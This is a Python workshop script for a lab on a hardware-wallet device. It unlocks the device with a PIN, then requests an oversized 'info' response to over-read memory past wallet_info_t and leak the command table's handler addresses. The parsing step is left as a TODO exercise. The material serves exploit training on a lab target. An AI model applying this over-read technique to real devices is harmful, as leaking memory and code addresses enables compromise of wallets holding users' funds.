#!/usr/bin/env python3

from __future__ import annotations

import argparse
import time

from helpers import (
    PortDiscoveryError,
    add_wallet_cli_args,
    create_wallet_client,
    encode_info_len_hex,
    format_duration_hhmmss,
    log,
    parse_ok_hex_response,
    resolve_wallet_port,
    normalize_pin_digits,
    pin_digits_to_hex,
)

WALLET_INFO_SIZE = 256
CMD_OPCODE_SIZE = 8
CMD_ENTRY_SIZE = 12
CMD_ENTRY_COUNT = 7
FLASH_DATA_CRC32_SIZE = 4
DEFAULT_LEAK_LEN = WALLET_INFO_SIZE + (CMD_ENTRY_SIZE * CMD_ENTRY_COUNT) + FLASH_DATA_CRC32_SIZE


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Lab 2 memory disclosure: leak cmd_table_t and parse handler pointers"
    )
    add_wallet_cli_args(parser)
    parser.add_argument(
        "--leak-len",
        type=lambda value: int(value, 0),
        default=DEFAULT_LEAK_LEN,
        help=f"Number of bytes requested via info (default: {DEFAULT_LEAK_LEN}, accepts 0xNNN).",
    )
    parser.add_argument(
        "--pin",
        required=True,
        help="PIN as decimal digits (required, e.g. 0123456789).",
    )
    parser.add_argument("--timeout", type=float, default=3.0)
    return parser.parse_args()


def dump_cmd_table(leaked: bytes) -> None:
    start = WALLET_INFO_SIZE
    if len(leaked) <= start:
        raise RuntimeError("leak does not extend past wallet_info_t")

    data = leaked[start:]

    # TODO(workshop, ~10 min):
    # Parse and print command handlers with a simple byte-stream approach:
    # - read 8 bytes and interpret as a zero-terminated ASCII opcode
    # - read next 4 bytes and interpret as a 32-bit little-endian address
    # - print one line with index, opcode, and address
    # - repeat until there are fewer than 12 bytes left

    raise NotImplementedError("TODO: implement dump_cmd_table")


def main() -> int:
    args = parse_args()
    started = time.perf_counter()

    try:
        port = resolve_wallet_port(args)
        log(f"port={port}")

        with create_wallet_client(args, port=port) as wallet:
            # Keep the device in a known state, then unlock before the info leak.
            wallet.request("lock")
            pin_digits = normalize_pin_digits(args.pin)
            pin_hex = pin_digits_to_hex(pin_digits)
            pin_response = wallet.request("pin", pin_hex, timeout=3.0)
            if not pin_response.ok:
                raise RuntimeError("PIN unlock failed")

            leak_arg = encode_info_len_hex(args.leak_len)
            response = wallet.request("info", leak_arg, timeout=args.timeout)
            leaked = parse_ok_hex_response(response)

            log(f"requested={args.leak_len} bytes")
            log(f"received={len(leaked)} bytes")
            if len(leaked) <= WALLET_INFO_SIZE:
                raise RuntimeError(
                    "no over-read observed; leak did not pass wallet_info_t boundary"
                )

            overread = len(leaked) - WALLET_INFO_SIZE
            log(f"overread={overread} bytes")

            dump_cmd_table(leaked)

            elapsed = format_duration_hhmmss(time.perf_counter() - started)
            log(f"time={elapsed}")
            return 0

    except PortDiscoveryError as e:
        log(f"port discovery error: {e}")
        return 2
    except Exception as e:
        elapsed = format_duration_hhmmss(time.perf_counter() - started)
        log(f"lab failed: {e}")
        log(f"time={elapsed}")
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
